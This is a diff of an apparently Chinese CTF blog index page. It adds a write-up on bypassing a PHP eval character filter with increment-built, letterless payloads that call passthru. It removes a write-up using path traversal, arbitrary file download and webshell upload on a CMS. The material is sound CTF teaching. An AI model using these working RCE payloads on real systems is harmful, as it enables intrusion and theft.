@@ -131,6 +131,74 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/09/12/CTFSHOW-shellmeRevenge-wp/" >CTFSHOW-shellmeRevenge-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-09-12
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://ctf.show/challenges#shellme_Revenge-1483">题目链接</a>   </p>
+<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><p>进入页面看到<code>phpinfo</code>  php版本为<code>7.2.34</code>  再看到被禁用的函数<code>disable_function</code></p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/09/12/CTFSHOW-shellmeRevenge-wp/0x1.png?raw=true" alt="m"></p>
+<p>发现 system, exec, shell_exec等都被禁用，但没有过滤<code>passthru</code></p>
+<p>查看网络流  发现包头的cookie中有hint: <code>?looklook</code>  url加上?looklook&#x3D;1可以得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">107</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里发现过滤了除<code>C</code>以外的字母  除<code>0-3</code>以外的数字</p>
+<p><code>^</code>被过滤  用不了异或；<code>~</code>被过滤  用不了取反   两个引号都被过滤</p>
+<h2 id="0x2-exp"><a href="#0x2-exp" class="headerlink" title="0x2 exp"></a>0x2 exp</h2><p>这里考虑自增   这里不知道是不是作者弄错了第10行中的判断条件用的是<code>||</code>  所以就算长度超了107也没事  那我们先不管长度  用自增构造<code>$_GET[1]($_GET[2])</code></p>
+<p>注意因为过滤了引号   直接<code>$a._</code>也可以实现连接  但调试的话php版本最好也是7.2  高版本这种操作可能不行</p>
+<h3 id="长度不限"><a href="#长度不限" class="headerlink" title="长度不限"></a>长度不限</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[]._;	</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;	<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;	<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;	<span class="comment">//G</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;	<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>;	<span class="comment">// _GET</span></span><br><span class="line"><span class="comment">// $$_[1]($$_[2]));</span></span><br><span class="line"><span class="comment">// $_GET[1]($_GET[2])</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>去掉换行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[]._;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>];<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="variable">$_</span>=_.<span class="variable">$_</span>;<span class="variable">$$_</span>[<span class="number">1</span>](<span class="variable">$$_</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>URL编码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ?looklook=1&amp;1=passthru&amp;2=ls /</span></span><br><span class="line">ctf_show=%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D._%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">5</span>B0%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>___.%<span class="number">24</span>__.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D_.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B1%<span class="number">5</span>D(%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B2%<span class="number">5</span>D)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure>
+
+<p>成功执行</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/09/12/CTFSHOW-shellmeRevenge-wp/0x2.png?raw=true" alt="m"></p>
+<h3 id="长度-lt-x3D-107"><a href="#长度-lt-x3D-107" class="headerlink" title="长度&lt;&#x3D;107"></a>长度&lt;&#x3D;107</h3><p>如果<code>10#</code>中的<code>||</code>换成<code>&amp;&amp;</code>的话  就需要压缩我们的payload了</p>
+<p>思路：<code>C -&gt; E -&gt; G</code>        <code>T</code>离得比较远 可以通过<code>C/C.C</code>获取到<code>NANC</code>进而  <code>N-&gt;T</code>  </p>
+<p><strong>这里</strong>可能有人会想为什么不从<code>Array</code>当中取出<code>r</code>然后到<code>t</code>呢 ？ php对于函数名类名大小写不敏感  但是对于<code>$_GET, $_POST</code>这一类变量是大小写敏感的  所以构造出的<code>$_GEt</code>发挥不了作用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$C</span>=(C/C.C)[<span class="number">0</span>];	<span class="comment">// N</span></span><br><span class="line"><span class="variable">$C</span>++;<span class="variable">$C</span>++;<span class="variable">$C</span>++;<span class="variable">$C</span>++;<span class="variable">$C</span>++;	<span class="comment">// S，不直接到T  下面拼接的时候行内自增</span></span><br><span class="line"><span class="variable">$_</span>=C;	</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;	<span class="comment">// E</span></span><br><span class="line"><span class="variable">$C</span>=<span class="variable">$_</span>.++<span class="variable">$C</span>;		<span class="comment">// ET</span></span><br><span class="line"><span class="variable">$_</span>++;	<span class="comment">// F	与第2行逻辑相同</span></span><br><span class="line"><span class="variable">$_</span>=_.++<span class="variable">$_</span>.<span class="variable">$C</span>;	<span class="comment">// _GET</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $C=(C/C.C)[0];$C++;$C++;$C++;$C++;$C++;$_=C;$_++;$_++;$C=$_.++$C;$_++;$_=_.++$_.$C;$$_[1]($$_[2]);</span></span><br><span class="line"><span class="comment">// strlen=98</span></span><br></pre></td></tr></table></figure>
+
+<p>更小：直接<code>N -&gt; O -&gt; P -&gt; S -&gt; T</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(_/_._)[<span class="number">0</span>];	<span class="comment">// N</span></span><br><span class="line">++<span class="variable">$_</span>;	<span class="comment">// O</span></span><br><span class="line"><span class="variable">$__</span>=_.<span class="variable">$_</span>.<span class="variable">$_</span>++;		<span class="comment">// _PO</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>.++<span class="variable">$_</span>.++<span class="variable">$_</span>;	<span class="comment">// _POST</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $_=(_/_._)[0];$__=++$_;$__=_.++$_.$__;$_++;$_++;$_=$__.++$_.++$_;$$_[0]($$_[1]);</span></span><br><span class="line"><span class="comment">// strlen=80   注意这里是POST了 跟GET传参方式不同</span></span><br></pre></td></tr></table></figure>
+
+<p>再压缩：将<code>_POST</code>作为POST的参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(_/_._)[_];                     <span class="comment">// N  注意这里的索引0有的php版本下也可以替换为非数字字符</span></span><br><span class="line">++<span class="variable">$_</span>;                              </span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++;                       <span class="comment">// PO</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;                         </span><br><span class="line"><span class="variable">$$_</span>[<span class="variable">$_</span>=_.<span class="variable">$__</span>.++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$_</span>[_]);   <span class="comment">// $$_[_POST]($$_[_])即$_POST[]($_POST[_])</span></span><br><span class="line"><span class="comment">// $_=(_/_._)[_];++$_;$__=$_.$_++;++$_;++$_;$$_[$_=_.$__.++$_.++$_]($$_[_]);</span></span><br><span class="line"><span class="comment">// strlen=73 		POST  _=ls&amp;_POST=passthru</span></span><br></pre></td></tr></table></figure>
+
+<p>删去换行 url编码后同样可以实现功能</p>
+<p>几个压缩点：</p>
+<ol>
+<li>行内自增完直接用就是新的值：<code>$C=$_.++$C;</code> </li>
+<li>多字符串一行拼接<code>$_=_.++$_.$C;</code></li>
+<li>找就近字母递增，过程中有遇到符合的记录下，不每次从头开始</li>
+<li><code>_/_, 0/0, C/C</code>都可以得到<code>NAN</code></li>
+<li><code>[0], [&#39;&#39;==&#39;.&#39;], [_]</code>都有可能起到同样作用</li>
+</ol>
+
+	
+	</div>
+  <a type="button" href="/2023/09/12/CTFSHOW-shellmeRevenge-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/09/08/De1ctf2019-SSRFMe-wp/" >De1ctf2019 SSRF Me wp</a>
 								</h3>
 							</div>
@@ -571,64 +639,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/08/30/GKCTF2021-easycms-wp/" >GKCTF2021-easycms-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-08-30
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1379">题目链接</a></p>
-<h2 id="0x1-信息收集"><a href="#0x1-信息收集" class="headerlink" title="0x1 信息收集"></a>0x1 信息收集</h2><ol>
-<li>页面点来点去发现没有有效跳转</li>
-<li>漏洞库搜索蝉知也没找到相关CVE</li>
-<li>目录扫描发现<code>/admin.php</code></li>
-</ol>
-<h2 id="0x2-登录"><a href="#0x2-登录" class="headerlink" title="0x2 登录"></a>0x2 登录</h2><p>弱口令<code>admin</code> <code>12345</code>登录成功</p>
-<h2 id="0x3-CMS分析"><a href="#0x3-CMS分析" class="headerlink" title="0x3 CMS分析"></a>0x3 CMS分析</h2><p>经过探索后发现</p>
-<ol>
-<li><p><code>设计 - 高级</code> 当中可以更改全局php文件，但是有要求</p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/30/GKCTF2021-easycms-wp/0x1.png?raw=true" alt="m"></p>
-</li>
-<li><p><code>设计 - 组件 - 素材库</code> 当中可以上传文件，但是像<code>php, phtml, .htaccess</code>什么的都上传不了，上传成功后可以编辑文件名、更换附件</p>
-</li>
-<li><p><code>设计 - 主题 - 自定义- 导出主题</code> 可以下载文件</p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/30/GKCTF2021-easycms-wp/0x2.png?raw=true" alt="m"></p>
-<p>由此可以得到下载链接<code>http://node4.anna.nssctf.cn:28447/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA=</code></p>
-</li>
-</ol>
-<h2 id="0x4-攻击"><a href="#0x4-攻击" class="headerlink" title="0x4 攻击"></a>0x4 攻击</h2><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>下载链接中的theme字段明显为base64编码  解码为 <code>/var/www/html/system/tmp/theme/default/1.zip</code></p>
-<p>由此猜测可以实现任意文件下载，获取flag：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> -n <span class="string">&#x27;/flag&#x27;</span> | <span class="built_in">base64</span></span><br><span class="line">L2ZsYWc=</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问 http://node4.anna.nssctf.cn:28447/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=</span></span><br><span class="line">$ <span class="built_in">cat</span> flag.zip</span><br><span class="line"><span class="comment"># flag</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><ol>
-<li><p>素材库中上传txt文件，编辑文件名尝试目录穿越，以满足<code>0x3.1.</code>中修改php文件</p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/30/GKCTF2021-easycms-wp/0x3.png?raw=true" alt="m"></p>
-<p>提示保存成功（注意目录穿越中如果不知道相对路径可以尝试多加几个<code>../</code>保证回退到根目录再使用绝对路径即可）</p>
-</li>
-<li><p>再次重复<code>0x3.1.</code>长传一句话木马即可成功上传，此时访问主页面post <code>cmd=system(&#39;cat /flag&#39;)</code>即可</p>
-</li>
-</ol>
-
-	
-	</div>
-  <a type="button" href="/2023/08/30/GKCTF2021-easycms-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -688,7 +698,7 @@
 		
 			<li><a href="/categories/reverse-wp/">reverse-wp<span>6</span></a></li>
 		
-			<li><a href="/categories/web-learning/">web-learning<span>7</span></a></li>
+			<li><a href="/categories/web-learning/">web-learning<span>8</span></a></li>
 		
 			<li><a href="/categories/web-wp/">web-wp<span>52</span></a></li>
 		
@@ -701,45 +711,45 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/CTF/">CTF<span>92</span></a></li>
+			<li><a href="/tags/CISCN2019/">CISCN2019<span>1</span></a></li>
 		
-			<li><a href="/tags/无字母rce/">无字母rce<span>3</span></a></li>
+			<li><a href="/tags/HNCTF2022/">HNCTF2022<span>2</span></a></li>
 		
-			<li><a href="/tags/PUT/">PUT<span>1</span></a></li>
+			<li><a href="/tags/ROP/">ROP<span>1</span></a></li>
 		
-			<li><a href="/tags/thread/">thread<span>1</span></a></li>
+			<li><a href="/tags/upload/">upload<span>4</span></a></li>
 		
-			<li><a href="/tags/UUCTF2022/">UUCTF2022<span>2</span></a></li>
+			<li><a href="/tags/Backdoorctf/">Backdoorctf<span>1</span></a></li>
+		
+			<li><a href="/tags/swampctf2019/">swampctf2019<span>1</span></a></li>
 		
 			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>3</span></a></li>
 		
-			<li><a href="/tags/got/">got<span>3</span></a></li>
-		
-			<li><a href="/tags/BKP2016/">BKP2016<span>1</span></a></li>
-		
-			<li><a href="/tags/Spring/">Spring<span>1</span></a></li>
-		
-			<li><a href="/tags/scxml/">scxml<span>1</span></a></li>
-		
-			<li><a href="/tags/BJDCTF2020/">BJDCTF2020<span>1</span></a></li>
-		
 			<li><a href="/tags/AFL/">AFL<span>2</span></a></li>
-		
-			<li><a href="/tags/D3CTF2019/">D3CTF2019<span>1</span></a></li>
-		
-			<li><a href="/tags/CISCN2019/">CISCN2019<span>1</span></a></li>
-		
-			<li><a href="/tags/ret2libc/">ret2libc<span>2</span></a></li>
 		
 			<li><a href="/tags/javascript/">javascript<span>1</span></a></li>
 		
-			<li><a href="/tags/StarCTF2018/">StarCTF2018<span>1</span></a></li>
+			<li><a href="/tags/SwampCTF2019/">SwampCTF2019<span>1</span></a></li>
 		
-			<li><a href="/tags/极客大挑战2020/">极客大挑战2020<span>1</span></a></li>
+			<li><a href="/tags/partial-overwrite/">partial overwrite<span>1</span></a></li>
 		
-			<li><a href="/tags/seccon2019/">seccon2019<span>1</span></a></li>
+			<li><a href="/tags/file-include/">file_include<span>5</span></a></li>
 		
-			<li><a href="/tags/天翼杯2021/">天翼杯2021<span>1</span></a></li>
+			<li><a href="/tags/Shiro/">Shiro<span>1</span></a></li>
+		
+			<li><a href="/tags/thread/">thread<span>1</span></a></li>
+		
+			<li><a href="/tags/pwn/">pwn<span>27</span></a></li>
+		
+			<li><a href="/tags/Hacklu2015/">Hacklu2015<span>1</span></a></li>
+		
+			<li><a href="/tags/rce/">rce<span>19</span></a></li>
+		
+			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
+		
+			<li><a href="/tags/got/">got<span>3</span></a></li>
+		
+			<li><a href="/tags/sql/">sql<span>8</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>121</span></a></li>
@@ -755,6 +765,10 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2024/01/10/node反序列化RCE/" ><i class="fa fa-file-o"></i>node反序列化RCE(CVE-2017-5941)</a>
+      </li>
+    
+      <li>
         <a href="/2024/01/04/HNCTF2023-BabyJxVx-wp/" ><i class="fa fa-file-o"></i>HNCTF2023-BabyJxVx-wp</a>
       </li>
     
@@ -768,10 +782,6 @@
     
       <li>
         <a href="/2023/12/20/HGAME2023-Designer-wp/" ><i class="fa fa-file-o"></i>HGAME2023-Designer-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/12/13/Shiro反序列化/" ><i class="fa fa-file-o"></i>Shiro反序列化</a>
       </li>
     
   </ul>
